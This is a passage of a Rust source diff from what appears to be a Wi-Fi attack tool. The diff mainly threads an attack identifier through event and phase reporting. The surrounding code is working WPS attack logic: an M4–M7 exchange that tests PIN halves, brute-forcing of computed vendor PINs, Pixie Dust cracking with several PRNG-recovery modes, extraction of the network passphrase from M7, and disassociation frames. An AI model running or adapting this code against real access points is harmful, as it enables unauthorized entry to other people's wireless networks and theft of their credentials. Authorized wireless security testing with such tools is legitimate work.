-    set_phase(info, WpsPhase::M4Sent);
+    set_phase(shared, info, WpsPhase::M4Sent, attack_id);
     set_detail(info, "M3 parsed — building M4 with R-Hash1, R-Hash2...");
     let m4_body = match session.build_m4_body() {
         Some(b) => b,
@@ -2181,13 +2246,13 @@ fn wps_single_exchange(
     let m4_frame = build_data_frame(&bssid, &session.our_mac, &m4_eap);
     let _ = shared.tx_frame(&m4_frame, tx_opts);
     inc_frames_sent(info);
-    push_event(events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M4 });
+    push_event(shared, events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M4 }, attack_id);
     set_detail_wait(info, "M4 sent \u{2014} waiting for M5 (validates first PIN half)", params.eap_timeout);
 
     // ── Receive M5 from AP (encrypted E-S1 — first half correct!) ──
     // If NACK here: first PIN half is WRONG
     reader.drain();
-    set_phase(info, WpsPhase::M5Received);
+    set_phase(shared, info, WpsPhase::M5Received, attack_id);
     let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
         Some(data) => { inc_frames_received(info); data }
         None => return ExchangeResult::Half1Wrong,
@@ -2204,7 +2269,7 @@ fn wps_single_exchange(
         session.eap_id = eap_data[1];
 
         if !session.parse_m5(wsc.body) { return ExchangeResult::Half1Wrong; }
-        push_event(events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M5 });
+        push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M5 }, attack_id);
     } else {
         return ExchangeResult::Half1Wrong;
     }
@@ -2215,7 +2280,7 @@ fn wps_single_exchange(
     }
 
     // ── Send M6 (encrypted R-S2) ──
-    set_phase(info, WpsPhase::M6Sent);
+    set_phase(shared, info, WpsPhase::M6Sent, attack_id);
     let m6_body = match session.build_m6_body() {
         Some(b) => b,
         None => return ExchangeResult::EapFailed,
@@ -2225,12 +2290,12 @@ fn wps_single_exchange(
     let m6_frame = build_data_frame(&bssid, &session.our_mac, &m6_eap);
     let _ = shared.tx_frame(&m6_frame, tx_opts);
     inc_frames_sent(info);
-    push_event(events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M6 });
+    push_event(shared, events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M6 }, attack_id);
 
     // ── Receive M7 from AP (encrypted E-S2 + credentials!) ──
     // If NACK here: second PIN half is WRONG
     reader.drain();
-    set_phase(info, WpsPhase::M7Received);
+    set_phase(shared, info, WpsPhase::M7Received, attack_id);
     let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
         Some(data) => { inc_frames_received(info); data }
         None => return ExchangeResult::Half2Wrong,
@@ -2245,7 +2310,7 @@ fn wps_single_exchange(
 
         // Parse M7 — extract credentials (the holy grail!)
         if let Some(psk) = session.parse_m7(wsc.body) {
-            push_event(events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M7 });
+            push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M7 }, attack_id);
 
             // Send WSC_NACK to cleanly terminate (we have what we need)
             let nack_body = build_wsc_nack(&session.e_nonce, &session.r_nonce, config_error::NO_ERROR);
@@ -2360,26 +2425,27 @@ fn run_computed_pins(
     ap_capability: u16,
     ap_rates: &[u8],
     serial: &Option<String>,
+    attack_id: AttackId,
 ) {
     use crate::protocol::wps_pin_gen::generate_pins;
 
     let candidates = generate_pins(&bssid, serial.as_deref());
     if candidates.is_empty() {
-        push_event(events, start, WpsEventKind::PinGenFailed);
+        push_event(shared, events, start, WpsEventKind::PinGenFailed, attack_id);
         return;
     }
 
-    push_event(events, start, WpsEventKind::PinGenStarted { candidates: candidates.len() });
+    push_event(shared, events, start, WpsEventKind::PinGenStarted { candidates: candidates.len() }, attack_id);
 
     for (idx, candidate) in candidates.iter().enumerate() {
         if !running.load(Ordering::SeqCst) { break; }
 
-        push_event(events, start, WpsEventKind::PinGenAttempt {
+        push_event(shared, events, start, WpsEventKind::PinGenAttempt {
             pin: candidate.pin.clone(),
             algo: candidate.algo.name().to_string(),
             attempt: idx + 1,
             total: candidates.len(),
-        });
+        }, attack_id);
 
         // Set the PIN for this exchange
         session.pin = candidate.pin.clone();
@@ -2394,16 +2460,16 @@ fn run_computed_pins(
         // Try full exchange (depth=2: complete through M7, extract credentials)
         let result = wps_single_exchange(
             shared, reader, bssid, ssid, params, session, info, events, running, start,
-            tx_opts, 2, ap_capability, ap_rates,
+            tx_opts, 2, ap_capability, ap_rates, attack_id,
         );
 
         match result {
             ExchangeResult::PinCorrect { psk } => {
-                push_event(events, start, WpsEventKind::PinGenSuccess {
+                push_event(shared, events, start, WpsEventKind::PinGenSuccess {
                     pin: candidate.pin.clone(),
                     algo: candidate.algo.name().to_string(),
                     psk: psk.clone(),
-                });
+                }, attack_id);
                 set_status(info, WpsStatus::Success);
                 let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                 i.pin_found = Some(candidate.pin.clone());
@@ -2423,7 +2489,7 @@ fn run_computed_pins(
         }
     }
 
-    push_event(events, start, WpsEventKind::PinGenFailed);
+    push_event(shared, events, start, WpsEventKind::PinGenFailed, attack_id);
 }
 
 /// Enhanced Pixie Dust cracking: try simple candidates first, then PRNG recovery modes.
@@ -2439,11 +2505,13 @@ fn run_computed_pins(
 /// Returns (pin_string, mode_name) on success.
 fn pixie_crack_enhanced(
     session: &WpsSession,
+    shared: &SharedAdapter,
     events: &Arc<EventRing<WpsEvent>>,
     start: Instant,
+    attack_id: AttackId,
 ) -> Option<(String, &'static str)> {
     // 1. Simple mode (existing fast path)
-    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "simple".to_string() });
+    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "simple".to_string() }, attack_id);
     if let Some(pin) = pixie_crack(session) {
         return Some((pin, "simple"));
     }
@@ -2452,60 +2520,60 @@ fn pixie_crack_enhanced(
     let e_nonce = &session.e_nonce;
 
     // 2. Ralink LFSR
-    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ralink-lfsr".to_string() });
+    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ralink-lfsr".to_string() }, attack_id);
     if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ralink(e_nonce) {
         if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
-            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                 mode: "ralink-lfsr".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
-            });
+            }, attack_id);
             return Some((pin, "ralink-lfsr"));
         }
     }
 
     // 3. eCos simple LCG
-    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simple".to_string() });
+    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simple".to_string() }, attack_id);
     if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_simple(e_nonce) {
         if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
-            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                 mode: "ecos-simple".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
-            });
+            }, attack_id);
             return Some((pin, "ecos-simple"));
         }
     }
 
     // 4. Realtek timestamp (use current Unix time as center)
-    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "realtek-timestamp".to_string() });
+    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "realtek-timestamp".to_string() }, attack_id);
     let now_secs = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap_or_default()
         .as_secs() as u32;
     if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_realtek_timestamp(e_nonce, now_secs) {
         if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
-            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                 mode: "realtek-timestamp".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
-            });
+            }, attack_id);
             return Some((pin, "realtek-timestamp"));
         }
     }
 
     // 5. eCos simplest
-    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simplest".to_string() });
+    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simplest".to_string() }, attack_id);
     if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_simplest(e_nonce) {
         if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
-            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                 mode: "ecos-simplest".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
-            });
+            }, attack_id);
             return Some((pin, "ecos-simplest"));
         }
     }
 
     // 6. eCos Knuth
-    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ecos-knuth".to_string() });
+    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ecos-knuth".to_string() }, attack_id);
     if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_knuth(e_nonce) {
         if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
-            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                 mode: "ecos-knuth".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
-            });
+            }, attack_id);
             return Some((pin, "ecos-knuth"));
         }
     }
@@ -2796,6 +2864,7 @@ fn send_disassoc(
     info: &Arc<Mutex<WpsInfo>>,
     events: &Arc<EventRing<WpsEvent>>,
     start: Instant,
+    attack_id: AttackId,
 ) {
     let disassoc = frames::build_disassoc(
         &bssid,
@@ -2805,23 +2874,48 @@ fn send_disassoc(
     );
     let _ = shared.tx_frame(&disassoc, tx_opts);
     inc_frames_sent(info);
-    push_event(events, start, WpsEventKind::DisassocSent { bssid });
+    push_event(shared, events, start, WpsEventKind::DisassocSent { bssid }, attack_id);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  Info/Event helpers
 // ═══════════════════════════════════════════════════════════════════════════════
 
-fn push_event(events: &Arc<EventRing<WpsEvent>>, start: Instant, kind: WpsEventKind) {
+fn push_event(
+    shared: &SharedAdapter,
+    events: &Arc<EventRing<WpsEvent>>,
+    start: Instant,
+    kind: WpsEventKind,
+    attack_id: AttackId,
+) {
     let seq = events.seq() + 1;
-    events.push(WpsEvent {
+    let timestamp = start.elapsed();
+
+    // Emit into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackEvent {
+        id: attack_id,
         seq,
-        timestamp: start.elapsed(),
-        kind,
-    });
+        timestamp,
+        event: AttackEventKind::Wps(kind.clone()),
+    }]);
+
+    // Push to legacy EventRing (still consumed by CLI polling path)
+    events.push(WpsEvent { seq, timestamp, kind });
 }
 
-fn set_phase(info: &Arc<Mutex<WpsInfo>>, phase: WpsPhase) {
+fn set_phase(
+    shared: &SharedAdapter,
+    info: &Arc<Mutex<WpsInfo>>,
+    phase: WpsPhase,
+    attack_id: AttackId,
+) {
+    // Emit phase change into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
+        id: attack_id,
+        phase: phase.to_attack_phase(),
+    }]);
+
+    // Update legacy Info struct (still consumed by CLI polling path)
     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
     i.phase = phase;
     i.elapsed = i.start_time.elapsed();
@@ -2844,6 +2938,28 @@ fn set_detail_wait(info: &Arc<Mutex<WpsInfo>>, detail: &str, timeout: Duration) 
     i.detail = detail.to_string();
     i.wait_started = Instant::now();
     i.wait_timeout = Some(timeout);
+}
+
+fn emit_counters(
+    shared: &SharedAdapter,
+    attack_id: AttackId,
+    info: &Arc<Mutex<WpsInfo>>,
+    start: Instant,
+    tx_fb: &crate::core::TxFeedback,
+) {
+    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
+    let elapsed_secs = start.elapsed().as_secs_f64();
+    if elapsed_secs > 0.0 {
+        info.frames_per_sec = info.frames_sent as f64 / elapsed_secs;
+    }
+    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
+        id: attack_id,
+        frames_sent: info.frames_sent,
+        frames_received: info.frames_received,
+        frames_per_sec: info.frames_per_sec,
+        elapsed: start.elapsed(),
+        tx_feedback: tx_fb.snapshot(),
+    }]);
 }
 
 fn inc_frames_sent(info: &Arc<Mutex<WpsInfo>>) {
